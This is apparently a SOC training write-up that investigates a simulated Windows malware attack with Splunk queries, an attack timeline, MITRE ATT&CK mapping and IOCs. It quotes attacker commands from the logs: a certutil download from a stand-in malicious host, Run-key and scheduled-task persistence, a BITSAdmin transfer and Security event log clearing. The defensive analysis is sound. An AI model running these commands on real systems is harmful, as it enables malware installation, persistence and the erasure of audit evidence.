# Investigation 8 – Malware Execution & Registry Persistence Detection using Splunk

## Overview

This investigation analyzes a simulated Windows malware attack involving malicious PowerShell execution, payload download, malware execution, registry persistence, scheduled task creation, BITSAdmin abuse, event log clearing, and attacker cleanup activity.

The objective was to investigate the complete attack lifecycle using Splunk SPL queries, identify Indicators of Compromise (IOCs), map attacker techniques to the MITRE ATT&CK framework, and reconstruct the attack timeline.

---

# Dataset Information

**File Name**

```text
investigation8_malware_execution.csv
```

**Windows Event IDs**

| Event ID | Description                 |
| -------- | --------------------------- |
| 4624     | Successful Logon            |
| 4625     | Failed Logon                |
| 4672     | Special Privileges Assigned |
| 4688     | Process Creation            |

---

# Investigation Objectives

* Analyze Windows Security Event Logs
* Detect malicious PowerShell execution
* Identify payload delivery
* Detect malware execution
* Investigate Registry Run Key persistence
* Detect Scheduled Task persistence
* Analyze LOLBins
* Detect Event Log clearing
* Reconstruct the attack timeline
* Produce a SOC Incident Report

---

# Investigation Questions & Findings

---

## Question 1 – Total Events

### Splunk Query

```spl
index=main source="investigation8_malware_execution.csv"
| stats count
```

### Result

**Total Events:** **25**

### Analysis

The dataset contains Windows authentication events, privilege assignments, process creation events, malware execution, persistence techniques, and anti-forensics activities.

---

## Question 2 – Windows Event ID Analysis

### Splunk Query

```spl
index=main source="investigation8_malware_execution.csv"
| stats count by event_id
```

### Result

| Event ID | Description                 | Count |
| -------- | --------------------------- | ----: |
| 4624     | Successful Logon            |     5 |
| 4625     | Failed Logon                |     1 |
| 4672     | Special Privileges Assigned |     1 |
| 4688     | Process Creation            |    18 |

### Analysis

Process Creation events (4688) dominate the dataset, indicating extensive command execution after system compromise.

---

## Question 3 – User Activity

### Splunk Query

```spl
index=main source="investigation8_malware_execution.csv"
| stats count by user
```

### Result

| User   | Event Count |
| ------ | ----------: |
| admin  |          17 |
| john   |           2 |
| sarah  |           2 |
| backup |           2 |
| test   |           2 |

### Analysis

The **admin** account generated the majority of events and performed all malicious activities observed during the investigation.

---

## Question 4 – Severity Analysis

### Splunk Query

```spl
index=main source="investigation8_malware_execution.csv"
| stats count by severity
```

### Result

| Severity | Count |
| -------- | ----: |
| Critical |     7 |
| High     |     2 |
| Medium   |     3 |
| Low      |    13 |

### Analysis

Most events are legitimate system activity; however, seven Critical events represent the core stages of the attack.

---

## Question 5 – Suspicious Process Analysis

### Splunk Query

```spl
index=main source="investigation8_malware_execution.csv"
| stats count by process_name
```

### Suspicious Processes

* powershell.exe
* certutil.exe
* payload.exe
* reg.exe
* schtasks.exe
* bitsadmin.exe
* wevtutil.exe
* whoami.exe
* netstat.exe
* nslookup.exe

### Malware

```
payload.exe
```

### LOLBins Identified

* PowerShell
* Certutil
* Reg
* Schtasks
* BITSAdmin
* Wevtutil

### Analysis

The attacker abused multiple built-in Windows utilities (LOLBins) to execute malware, establish persistence, and evade detection.

---

## Question 6 – Initial PowerShell Execution

### Splunk Query

```spl
index=main source="investigation8_malware_execution.csv"
process_name="powershell.exe"
| table timestamp hostname user command_line severity
```

### Findings

* PowerShell Execution Policy Bypass
* Encoded PowerShell Command

### Commands

```text
powershell.exe -ExecutionPolicy Bypass
powershell.exe -enc SQBFAFgA
```

### Analysis

The attacker bypassed PowerShell execution restrictions and executed Base64-encoded commands to evade detection and execute malicious code.

---

## Question 7 – Payload Download

### Splunk Query

```spl
index=main source="investigation8_malware_execution.csv"
process_name="certutil.exe"
| table timestamp hostname user command_line severity
```

### Finding

```text
certutil.exe -urlcache -split -f http://malicious-site/payload.exe payload.exe
```

### Downloaded File

```
payload.exe
```

### Analysis

The attacker abused **Certutil**, a trusted Windows utility, to download malware without introducing additional tools.

---

## Question 8 – Malware Execution

### Splunk Query

```spl
index=main source="investigation8_malware_execution.csv"
process_name="payload.exe"
```

### Finding

```
payload.exe
```

### Analysis

The downloaded malware was successfully executed by the **admin** account, confirming successful code execution on the compromised system.

---

## Question 9 – Registry Persistence

### Splunk Query

```spl
index=main source="investigation8_malware_execution.csv"
process_name="reg.exe"
```

### Command

```text
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d payload.exe
```

### Analysis

The attacker modified the Windows **Run Registry Key** to automatically launch **payload.exe** whenever the user logs in.

---

## Question 10 – Scheduled Task Persistence

### Splunk Query

```spl
index=main source="investigation8_malware_execution.csv"
process_name="schtasks.exe"
```

### Command

```text
schtasks /create /sc onlogon /tn updater /tr payload.exe
```

### Analysis

A scheduled task named **updater** was created to execute **payload.exe** at user logon, providing an additional persistence mechanism.

---

## Question 11 – BITSAdmin Payload Transfer

### Splunk Query

```spl
index=main source="investigation8_malware_execution.csv"
process_name="bitsadmin.exe"
```

### Command

```text
bitsadmin /transfer payload2.exe
```

### Analysis

The attacker abused **BITSAdmin** to download another payload while blending into legitimate Windows background activity.

---

## Question 12 – Event Log Clearing

### Splunk Query

```spl
index=main source="investigation8_malware_execution.csv"
process_name="wevtutil.exe"
```

### Command

```text
wevtutil cl Security
```

### Analysis

The Windows Security Event Log was cleared to remove evidence of the attack, demonstrating an anti-forensics technique.

---

# Attack Timeline

| Time     | Activity                                 |
| -------- | ---------------------------------------- |
| 08:02:11 | Administrator successfully logged in     |
| 08:03:05 | Special privileges assigned              |
| 08:04:15 | PowerShell Execution Policy Bypass       |
| 08:04:42 | Encoded PowerShell executed              |
| 08:05:21 | Payload downloaded using Certutil        |
| 08:06:30 | payload.exe executed                     |
| 08:07:20 | Registry Run Key persistence established |
| 08:15:25 | Scheduled Task "updater" created         |
| 08:16:42 | payload2.exe downloaded using BITSAdmin  |
| 08:21:44 | Windows Security Event Log cleared       |
| 08:22:58 | payload.exe deleted from the system      |

---

# MITRE ATT&CK Mapping

| Technique                          | ID        |
| ---------------------------------- | --------- |
| PowerShell                         | T1059.001 |
| Ingress Tool Transfer              | T1105     |
| Registry Run Keys / Startup Folder | T1547.001 |
| Scheduled Task / Job               | T1053.005 |
| BITS Jobs                          | T1197     |
| Clear Windows Event Logs           | T1070.001 |

---

# Indicators of Compromise (IOCs)

* PowerShell Execution Policy Bypass
* Encoded PowerShell
* Certutil Payload Download
* payload.exe Execution
* Registry Run Key Modification
* Scheduled Task Creation
* BITSAdmin Payload Transfer
* Windows Event Log Clearing
* Payload Cleanup

---

# SOC Incident Summary

The investigation identified a complete malware attack against **WIN-SRV01**. The attacker gained administrative access and executed PowerShell using **Execution Policy Bypass** and **Base64-encoded commands** to launch malicious code.

The attacker downloaded **payload.exe** using **Certutil**, executed the malware, established persistence through both **Registry Run Keys** and **Scheduled Tasks**, and downloaded an additional payload using **BITSAdmin**.

Finally, the attacker attempted to hide evidence by clearing the Windows Security Event Log using **wevtutil** and deleting the malware executable from the system.

---

# Conclusion

This investigation demonstrates a complete Windows malware attack lifecycle including execution, persistence, payload delivery, anti-forensics, and cleanup.

Multiple LOLBins were abused throughout the attack, allowing the attacker to blend malicious actions with legitimate Windows administration tools.

**Overall Incident Severity:** **Critical**
